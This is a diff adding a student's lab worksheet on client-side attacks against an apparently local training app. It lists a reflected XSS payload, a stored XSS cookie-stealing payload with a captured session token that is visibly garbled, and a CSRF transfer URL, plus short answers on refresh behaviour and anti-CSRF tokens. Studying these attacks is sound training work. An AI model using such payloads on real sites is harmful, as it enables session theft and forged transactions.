@@ -1,0 +1,37 @@
+==================================================
+SESSION 26: CLIENT-SIDE ATTACK PAYLOADS
+==================================================
+
+1. REFLECTED XSS
+* Payload Used: [<h1>Hacked</h1>]
+* Concept: Why does this attack disappear when you refresh the page?
+Answer: When you hit refresh, it's like submitting a new request to load the page.this means that the orginal script that was hacked is no longer being ran.  
+
+2. STORED XSS (Cookie Theft)
+* Cookie Value Stolen: [language=en;
+token=eyJ0eXA¡OiJKV1QLCJhbGciOiJSUz|1NiJ9.eyJzdGF0dXMiOiJzd
+WNjZXNz
+liwiZGFOYSI6eyJpZCI6MSwidXNIcm5hbWUiOiliLCJIbWFpbCI6lmFkb
+WuQGp1aWNILXNoLm9wliwi
+cGFzc3dvcmQiOilwMTkÿMDIzYTdiYmQ3Mz|1MDUxNmYwNjIkZjE4Yj
+UwMCIsIn/vbGUiOiJhZG1pbils
+ImRIbHV4ZVRva2VuljoliwibGFzdExvZ2luSXA¡OiliLCwcm9maWx/SW
+1hZ2UiOiJhc3NIdHMvcHVi
+bljL2ItYWdIcy91cGxvYWRzL2RIZmF1bHRBZG1pbi5wbmciLCJ0b3R
+wU2VjcmVOljoiliwiaXNBY3Rp
+dmUionRydWUslmNyZWFOZWRBdCi6ijlwMjYtMDUtMTcgMjA6NDg
+6MTAuOTky|CswMDowMCIsInVwZGFO
+ZWRBdCI6ljIwMjYtMDUtMTcgMjA6NDg6MTAuOTky|CswMDowMCls
+ImRIbGV0ZWRBdCI6bnVsbH0sImlh
+dCI6MT30TA1NTI1M30.VdDtJmRCSOTAmeEVbxx5ZevS3F2sTVlua-
+k-
+v4bRzZKrak Tv6R4u 1onrTQlIZuhKAa8Tn8h3E6N4K86eityFisYtD7wEb
+ZdDM9Jijsr5Q|SaCa-Dz3Nvwzzf2-
+JBP6luqVRpsSUrg4_sx8ra5dhdbfFqMFv8dBVaUnDF9d4f0s;
+session id=admin_secret 99812_do not share]
+* Payload Used: [<script>alert(document.cookie)</script>]
+
+3. CROSS-SITE REQUEST FORGERY (CSRF)
+* Malicious URL Crafted: [http://127.0.0.1:8081/transfer?to=Attacker+&amount=5000]
+* Concept: What is the primary defense against CSRF?
+Answer: AN anti-CSRF Token which allows the website to do a second authentication. 
